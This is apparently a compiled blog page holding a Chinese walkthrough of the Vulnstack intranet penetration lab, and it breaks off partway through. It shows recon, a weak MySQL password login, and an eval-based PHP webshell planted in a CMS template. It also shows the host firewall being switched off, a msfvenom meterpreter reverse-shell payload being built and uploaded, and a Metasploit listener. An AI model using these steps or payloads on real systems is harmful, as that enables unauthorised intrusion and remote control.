import{_ as l,c as t,b as n,a as p,d as a,e as i,r as c,o}from"./app-Dh5bFHR3.js";const u="/blog/assets/image-20220810172541831-R4fn7Q6E.png",r="/blog/assets/image-20220810180624518-BC95mQVU.png",d="/blog/assets/image-20220810210622951-DQ-TTEwm.png",m="/blog/assets/image-20220810213508539-zPTdVI_M.png",v="/blog/assets/image-20220810213657373-Cd99pccn.png",b="/blog/assets/image-20220810214003621-Cap_jmfU.png",k="/blog/assets/image-20220810214158744-BwKXrRGK.png",g="/blog/assets/image-20220810235251383-tDBxsJYl.png",h="/blog/assets/image-20220811142631141-D6IJNTtw.png",x="/blog/assets/image-20220811142846156-D79plGIu.png",f="/blog/assets/image-20220811143010076-ceuh7M4P.png",y="/blog/assets/image-20220811143241513-CCpAY2Ol.png",S="/blog/assets/image-20220811143326582-C7KNDc2W.png",T="/blog/assets/image-20220811143422502-DwJ3pqg-.png",w="/blog/assets/image-20220811143650676-CrMDQvQV.png",A="/blog/assets/image-20220811144748232-D0-Lzmfy.png",_="/blog/assets/image-20220811145021077-CwrqqXlA.png",C="/blog/assets/image-20220811145156669-Cvxa3jNP.png",E="/blog/assets/image-20220811181014648-Bdl5p74U.png",O="/blog/assets/image-20220811181159361-B5V6Wez8.png",R="/blog/assets/image-20220811182111039-DWaUa6qb.png",M="/blog/assets/image-20220811184743952-nMW3qpoV.png",D="/blog/assets/image-20220811204915927-B-XkFSnf.png",P="/blog/assets/image-20220811210453367-DkWYOr6o.png",N="/blog/assets/image-20220811234420908-BhdTpb-v.png",I="/blog/assets/image-20220811233638539-BCeQuQfd.png",W="/blog/assets/image-20220811233803703-B_mxbL_p.png",q="/blog/assets/image-20220812193821408-89Nrez8k.png",H="/blog/assets/image-20220812193829530-DxEycJpJ.png",V="/blog/assets/image-20220813012832949-CURhNdXW.png",B="/blog/assets/image-20220812203942962-B-sx1aDO.png",Y="/blog/assets/image-20220812204000037-rrjmgPm0.png",U="/blog/assets/image-20220812204213769-Cw2kxFRM.png",j="/blog/assets/image-20220813013038873-Cx0QG16m.png",L="/blog/assets/image-20220813013434738-D-u0hzer.png",G="/blog/assets/image-20220813013826709-D633275O.png",K="/blog/assets/image-20220813013626626-Du5FuNcP.png",z="/blog/assets/image-20220813014237238-mSViJz-2.png",F="/blog/assets/image-20220813014501295-DBJURvyX.png",X="/blog/assets/image-20220814170532122-CNKd-xJK.png",Z="/blog/assets/image-20220814173528143-CBzUD0Jm.png",Q="/blog/assets/image-20220814194107916-DnbfGzxw.png",J="/blog/assets/image-20220814225454974-BCUcvl4Z.png",$="/blog/assets/image-20220814225701766-BF5jobhL.png",ss="/blog/assets/image-20220814225917789-Dc-c1MBn.png",ns="/blog/assets/image-20220814232334204-B13bImKj.png",as="/blog/assets/image-20220815002522071-CbEKQXS1.png",es="data:image/png;base64,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",ps="/blog/assets/image-20220815002731903-C0f5DqR_.png",is="/blog/assets/image-20220815013954624-DTIENS7X.png",ls="/blog/assets/image-20220815151257133-_xbt3gLe.png",ts="/blog/assets/image-20220815151634275-Ce-1J4jt.png",cs="/blog/assets/image-20220815151840765-Z_uyQrLj.png",os="/blog/assets/image-20220815152357885-6qnP-A8j.png",us="/blog/assets/image-20220815155618348-CySxRL-O.png",rs="/blog/assets/image-20220815155810801-HEdUeDBN.png",ds="/blog/assets/image-20220815174304021-CRq8hgGO.png",ms={},vs={href:"http://vulnstack.qiyuanxuetang.net/vuln/detail/2/",target:"_blank",rel:"noopener noreferrer"},bs={href:"https://github.com/maurosoria/dirsearch",target:"_blank",rel:"noopener noreferrer"};function ks(hs,s){const e=c("ExternalLinkIcon");return o(),t("div",null,[n("p",null,[s[1]||(s[1]=a("参考链接：")),n("a",vs,[s[0]||(s[0]=a("漏洞详情 (qiyuanxuetang.net)")),i(e)])]),s[3]||(s[3]=p('<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建"><span>环境搭建</span></a></h2><p>环境介绍：三台机器，Win7是对外的web机，Win2003和Win2008是内网机器</p><p>网络拓扑：</p><p><img src="'+u+'" alt="image-20220810172541831"></p><p>虚拟机网络配置：</p><p><img src="'+r+'" alt="image-20220810180624518"></p><p>Win7中确认防火墙状态</p><p><img src="'+d+'" alt="image-20220810210622951"></p><p>将三台靶机关机创建快照，然后全部启动（Kali也要），并启动Win7的PHP和MySQL。</p><p><img src="'+m+'" alt="image-20220810213508539"></p><p>至此，环境搭建完毕</p><h2 id="信息收集" tabindex="-1"><a class="header-anchor" href="#信息收集"><span>信息收集</span></a></h2><p>在Kali中用nmap扫Win7，可以扫到80和3306端口处于启用状态</p><p><img src="'+v+'" alt="image-20220810213657373"></p><p>登陆网站，发现phpStudy探针，暴露大量隐私信息</p><p><img src="'+b+'" alt="image-20220810214003621"></p><p>3306端口的MySQL也可见，使用弱口令<code>root</code>, <code>root</code>也成功登陆</p><p><img src="'+k+`" alt="image-20220810214158744"></p><p>存在问题：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">HTTP明文传输</span>
<span class="line">服务器指纹泄露（系统、Apache、PHP版本）</span>
<span class="line">phpInfo信息泄露</span>
<span class="line">MySQL数据库弱口令</span>
<span class="line">MySQL数据库口令爆破</span>
<span class="line">phpStudy后门（待检测）</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="目录扫描" tabindex="-1"><a class="header-anchor" href="#目录扫描"><span>目录扫描</span></a></h3><h4 id="法一-御剑扫一下后台" tabindex="-1"><a class="header-anchor" href="#法一-御剑扫一下后台"><span>法一：御剑扫一下后台</span></a></h4><p><img src="`+g+'" alt="image-20220810235251383"></p><h4 id="法二-dirsearch-py" tabindex="-1"><a class="header-anchor" href="#法二-dirsearch-py"><span>法二：Dirsearch.py</span></a></h4>',24)),n("p",null,[n("a",bs,[s[2]||(s[2]=a("maurosoria/dirsearch: Web path scanner (github.com)")),i(e)])]),s[4]||(s[4]=p(`<div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/Documents/Git/dirsearch<span class="token punctuation">]</span></span>
<span class="line">└─<span class="token comment"># python3 dirsearch.py -u 192.168.220.138  </span></span>
<span class="line"></span>
<span class="line">  _<span class="token operator">|</span><span class="token builtin class-name">.</span> _ _  _  _  _ _<span class="token operator">|</span>_    v0.4.2.8                                                   </span>
<span class="line"> <span class="token punctuation">(</span>_<span class="token operator">||</span><span class="token operator">|</span> _<span class="token punctuation">)</span> <span class="token punctuation">(</span>/_<span class="token punctuation">(</span>_<span class="token operator">||</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token punctuation">)</span>                                                              </span>
<span class="line">                                                                                     </span>
<span class="line">Extensions: php, aspx, jsp, html, js <span class="token operator">|</span> HTTP method: GET <span class="token operator">|</span> Threads: <span class="token number">25</span></span>
<span class="line">Wordlist size: <span class="token number">11374</span></span>
<span class="line"></span>
<span class="line">Output File: /home/kali/Documents/Git/dirsearch/reports/_192.168.220.138/_22-08-13_07-04-34.txt</span>
<span class="line"></span>
<span class="line">Target: http://192.168.220.138/</span>
<span class="line"></span>
<span class="line"><span class="token punctuation">[</span>07:04:34<span class="token punctuation">]</span> Starting:                                                                 </span>
<span class="line"><span class="token punctuation">[</span>07:04:37<span class="token punctuation">]</span> <span class="token number">403</span> -  211B  - /%3f/                                             </span>
<span class="line"><span class="token punctuation">[</span>07:04:37<span class="token punctuation">]</span> <span class="token number">403</span> -  215B  - /%C0%AE%C0%AE%C0%AF                               </span>
<span class="line"><span class="token punctuation">[</span>07:04:37<span class="token punctuation">]</span> <span class="token number">403</span> -  210B  - /%ff                                              </span>
<span class="line"><span class="token punctuation">[</span>07:04:40<span class="token punctuation">]</span> <span class="token number">403</span> -  220B  - /.ht_wsr.txt                                      </span>
<span class="line"><span class="token punctuation">[</span>07:04:40<span class="token punctuation">]</span> <span class="token number">403</span> -  223B  - /.htaccess.bak1                                   </span>
<span class="line"><span class="token punctuation">[</span>07:04:40<span class="token punctuation">]</span> <span class="token number">403</span> -  225B  - /.htaccess.sample</span>
<span class="line"><span class="token punctuation">[</span>07:04:40<span class="token punctuation">]</span> <span class="token number">403</span> -  223B  - /.htaccess_orig</span>
<span class="line"><span class="token punctuation">[</span>07:04:40<span class="token punctuation">]</span> <span class="token number">403</span> -  221B  - /.htaccess_sc</span>
<span class="line"><span class="token punctuation">[</span>07:04:40<span class="token punctuation">]</span> <span class="token number">403</span> -  222B  - /.htaccessOLD2</span>
<span class="line"><span class="token punctuation">[</span>07:04:40<span class="token punctuation">]</span> <span class="token number">403</span> -  221B  - /.htaccessBAK</span>
<span class="line"><span class="token punctuation">[</span>07:04:40<span class="token punctuation">]</span> <span class="token number">403</span> -  221B  - /.htaccessOLD</span>
<span class="line"><span class="token punctuation">[</span>07:04:40<span class="token punctuation">]</span> <span class="token number">403</span> -  213B  - /.htm</span>
<span class="line"><span class="token punctuation">[</span>07:04:40<span class="token punctuation">]</span> <span class="token number">403</span> -  223B  - /.htaccess.orig</span>
<span class="line"><span class="token punctuation">[</span>07:04:40<span class="token punctuation">]</span> <span class="token number">403</span> -  223B  - /.htaccess.save</span>
<span class="line"><span class="token punctuation">[</span>07:04:40<span class="token punctuation">]</span> <span class="token number">403</span> -  223B  - /.htpasswd_test</span>
<span class="line"><span class="token punctuation">[</span>07:04:40<span class="token punctuation">]</span> <span class="token number">403</span> -  219B  - /.htpasswds</span>
<span class="line"><span class="token punctuation">[</span>07:04:40<span class="token punctuation">]</span> <span class="token number">403</span> -  220B  - /.httr-oauth</span>
<span class="line"><span class="token punctuation">[</span>07:04:40<span class="token punctuation">]</span> <span class="token number">403</span> -  224B  - /.htaccess_extra</span>
<span class="line"><span class="token punctuation">[</span>07:04:40<span class="token punctuation">]</span> <span class="token number">403</span> -  214B  - /.html                                            </span>
<span class="line"><span class="token punctuation">[</span>07:05:19<span class="token punctuation">]</span> <span class="token number">403</span> -  225B  - /index.php::<span class="token variable">$DATA</span>                                 </span>
<span class="line"><span class="token punctuation">[</span>07:05:32<span class="token punctuation">]</span> <span class="token number">200</span> -   71KB - /phpinfo.php                                                                                               </span>
<span class="line"><span class="token punctuation">[</span>07:05:32<span class="token punctuation">]</span> <span class="token number">301</span> -  242B  - /phpmyadmin  -<span class="token operator">&gt;</span>  http://192.168.220.138/phpmyadmin/                                                        </span>
<span class="line"><span class="token punctuation">[</span>07:05:32<span class="token punctuation">]</span> <span class="token number">301</span> -  242B  - /phpMyAdmin  -<span class="token operator">&gt;</span>  http://192.168.220.138/phpMyAdmin/                                                        </span>
<span class="line"><span class="token punctuation">[</span>07:05:33<span class="token punctuation">]</span> <span class="token number">200</span> -   32KB - /phpmyadmin/ChangeLog                                                                                      </span>
<span class="line"><span class="token punctuation">[</span>07:05:33<span class="token punctuation">]</span> <span class="token number">200</span> -    2KB - /phpmyadmin/README                                                                                         </span>
<span class="line"><span class="token punctuation">[</span>07:05:34<span class="token punctuation">]</span> <span class="token number">200</span> -    4KB - /phpmyadmin/index.php                                                                                      </span>
<span class="line"><span class="token punctuation">[</span>07:05:34<span class="token punctuation">]</span> <span class="token number">200</span> -    4KB - /phpmyadmin/                                                                                               </span>
<span class="line"><span class="token punctuation">[</span>07:05:34<span class="token punctuation">]</span> <span class="token number">200</span> -    4KB - /phpMyAdmin/                                                                                               </span>
<span class="line"><span class="token punctuation">[</span>07:05:35<span class="token punctuation">]</span> <span class="token number">200</span> -    4KB - /phpmyAdmin/                                                                                               </span>
<span class="line"><span class="token punctuation">[</span>07:05:35<span class="token punctuation">]</span> <span class="token number">200</span> -    4KB - /phpMyadmin/</span>
<span class="line"><span class="token punctuation">[</span>07:05:34<span class="token punctuation">]</span> <span class="token number">200</span> -    4KB - /phpMyAdmin/index.php                             </span>
<span class="line"><span class="token punctuation">[</span>07:05:49<span class="token punctuation">]</span> <span class="token number">403</span> -  225B  - /Trace.axd::<span class="token variable">$DATA</span>                                 </span>
<span class="line"><span class="token punctuation">[</span>07:05:54<span class="token punctuation">]</span> <span class="token number">403</span> -  226B  - /web.config::<span class="token variable">$DATA</span>                                </span>
<span class="line">                                                                             </span>
<span class="line">Task Completed</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="指纹识别" tabindex="-1"><a class="header-anchor" href="#指纹识别"><span>指纹识别</span></a></h2><h3 id="whatweb" tabindex="-1"><a class="header-anchor" href="#whatweb"><span><strong>Whatweb</strong></span></a></h3><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/Documents/Git/dirsearch<span class="token punctuation">]</span></span>
<span class="line">└─<span class="token comment"># whatweb 192.168.220.138</span></span>
<span class="line">http://192.168.220.138 <span class="token punctuation">[</span><span class="token number">200</span> OK<span class="token punctuation">]</span> Apache<span class="token punctuation">[</span><span class="token number">2.4</span>.23<span class="token punctuation">]</span>, Country<span class="token punctuation">[</span>RESERVED<span class="token punctuation">]</span><span class="token punctuation">[</span>ZZ<span class="token punctuation">]</span>, Email<span class="token punctuation">[</span>admin@phpStudy.net<span class="token punctuation">]</span>, HTTPServer<span class="token punctuation">[</span>Windows <span class="token punctuation">(</span><span class="token number">32</span> bit<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span>Apache/2.4.23 <span class="token punctuation">(</span>Win32<span class="token punctuation">)</span> OpenSSL/1.0.2j PHP/5.4.45<span class="token punctuation">]</span>, IP<span class="token punctuation">[</span><span class="token number">192.168</span>.220.138<span class="token punctuation">]</span>, OpenSSL<span class="token punctuation">[</span><span class="token number">1.0</span>.2j<span class="token punctuation">]</span>, PHP<span class="token punctuation">[</span><span class="token number">5.4</span>.45<span class="token punctuation">]</span>, PasswordField<span class="token punctuation">[</span>password<span class="token punctuation">]</span>, Title<span class="token punctuation">[</span>phpStudy 探针 <span class="token number">2014</span><span class="token punctuation">]</span>, X-Powered-By<span class="token punctuation">[</span>PHP/5.4.45<span class="token punctuation">]</span>, X-UA-Compatible<span class="token punctuation">[</span>IE<span class="token operator">=</span>EmulateIE7<span class="token punctuation">]</span> </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="御剑web指纹识别-大禹cms系统识别" tabindex="-1"><a class="header-anchor" href="#御剑web指纹识别-大禹cms系统识别"><span>御剑Web指纹识别/大禹CMS系统识别</span></a></h3><p>略</p><h2 id="漏洞分析" tabindex="-1"><a class="header-anchor" href="#漏洞分析"><span>漏洞分析</span></a></h2><p>根据探测结果尝试访问phpMyAdmin，并使用弱密码<code>root</code>, <code>root</code> 成功登陆后台</p><p>发现一张表 <code>newyxcms</code>，CMS为内容管理系统的意思</p><p><img src="`+h+'" alt="image-20220811142631141"></p><p>分辨出网站使用的是yxcms，尝试访问。</p><p>然后在公告信息中发现后台用户名和密码</p><p><img src="'+x+'" alt="image-20220811142846156"></p><p>根据提示成功进入管理后台，并发现网站版本为1.2.1</p><blockquote><p>如果没有发现密码，可以通过探测 <code>beifen.rar</code> 检查网站版本号，然后到网上找该版本号存在的漏洞进行攻击。</p></blockquote><p><img src="'+f+'" alt="image-20220811143010076"></p><p>在后台“前台模板”模块中发现可以编辑模板，模板通常可以自定义php文件，而如果可以自定义php文件直接就可以上一句话木马了。</p><p><img src="'+y+'" alt="image-20220811143241513"></p><p><img src="'+S+'" alt="image-20220811143326582"></p><h2 id="渗透攻击" tabindex="-1"><a class="header-anchor" href="#渗透攻击"><span>渗透攻击</span></a></h2><p>嵌入一句话木马<code>&lt;?php @eval($_REQUEST[666])?&gt;</code>，然后保存</p><p><img src="'+T+'" alt="image-20220811143422502"></p><p>上面御剑探测时没有探测到info.php在哪，所以到网上找一下yxcms的目录结构</p><p><code>protected\\apps\\default\\view\\</code></p><p><img src="'+w+'" alt="image-20220811143650676"></p><p>到蚁剑中右键 添加数据：</p><p><code>http://192.168.220.138/yxcms/protected/apps/default/view/default/info.php</code></p><p><img src="'+A+'" alt="image-20220811144748232"></p><p>到shell里看一下<code>ipconfig</code></p><p><img src="'+_+'" alt="image-20220811145021077"></p><p>查看防火墙状态 <code>netsh advfirewall show allprofiles</code></p><p><img src="'+C+`" alt="image-20220811145156669"></p><p>关闭防火墙 <code>netsh advfirewall set allprofiles state off</code></p><h3 id="制作并上传木马" tabindex="-1"><a class="header-anchor" href="#制作并上传木马"><span>制作并上传木马</span></a></h3><h4 id="制作后门" tabindex="-1"><a class="header-anchor" href="#制作后门"><span>制作后门</span></a></h4><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/Desktop<span class="token punctuation">]</span></span>
<span class="line">└─<span class="token comment"># msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.220.137 lport=9999 -f exe -o houmen.exe</span></span>
<span class="line"></span>
<span class="line"><span class="token punctuation">[</span>-<span class="token punctuation">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span>
<span class="line"><span class="token punctuation">[</span>-<span class="token punctuation">]</span> No arch selected, selecting arch: x64 from the payload</span>
<span class="line">No encoder specified, outputting raw payload</span>
<span class="line">Payload size: <span class="token number">510</span> bytes</span>
<span class="line">Final size of exe file: <span class="token number">7168</span> bytes</span>
<span class="line">Saved as: houmen.exe</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="加个壳" tabindex="-1"><a class="header-anchor" href="#加个壳"><span>加个壳</span></a></h4><p><img src="`+E+'" alt="image-20220811181014648"></p><h4 id="上传后门" tabindex="-1"><a class="header-anchor" href="#上传后门"><span>上传后门</span></a></h4><p>加壳版和普通版都传，以防万一</p><p><img src="'+O+'" alt="image-20220811181159361"></p><p><img src="'+R+`" alt="image-20220811182111039"></p><h4 id="监听" tabindex="-1"><a class="header-anchor" href="#监听"><span>监听</span></a></h4><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">msf6 <span class="token operator">&gt;</span> use exploit/multi/handler</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using configured payload generic/shell_reverse_tcp</span>
<span class="line">msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options</span>
<span class="line"></span>
<span class="line">Module options <span class="token punctuation">(</span>exploit/multi/handler<span class="token punctuation">)</span>:</span>
<span class="line"></span>
<span class="line">   Name  Current Setting  Required  Description</span>
<span class="line">   ----  ---------------  --------  -----------</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Payload options <span class="token punctuation">(</span>generic/shell_reverse_tcp<span class="token punctuation">)</span>:</span>
<span class="line"></span>
<span class="line">   Name   Current Setting  Required  Description</span>
<span class="line">   ----   ---------------  --------  -----------</span>
<span class="line">   LHOST                   <span class="token function">yes</span>       The listen address <span class="token punctuation">(</span>an interface may be specifi</span>
<span class="line">                                     ed<span class="token punctuation">)</span></span>
<span class="line">   LPORT  <span class="token number">4444</span>             <span class="token function">yes</span>       The listen port</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Exploit target:</span>
<span class="line"></span>
<span class="line">   Id  Name</span>
<span class="line">   --  ----</span>
<span class="line">   <span class="token number">0</span>   Wildcard Target</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> payload windows/x64/meterpreter/reverse_tcp</span>
<span class="line">payload <span class="token operator">=</span><span class="token operator">&gt;</span> windows/x64/meterpreter/reverse_tcp                                                                                       </span>
<span class="line">msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.220.137</span>
<span class="line">lhost <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span>.220.137                                                                                                             </span>
<span class="line">msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> lport <span class="token number">9999</span></span>
<span class="line">lport <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">9999</span>                                                                                                                        </span>
<span class="line">msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options </span>
<span class="line">                                                                                                                                     </span>
<span class="line">Module options <span class="token punctuation">(</span>exploit/multi/handler<span class="token punctuation">)</span>:                                                                                              </span>
<span class="line">                                                                                                                                     </span>
<span class="line">   Name  Current Setting  Required  Description</span>
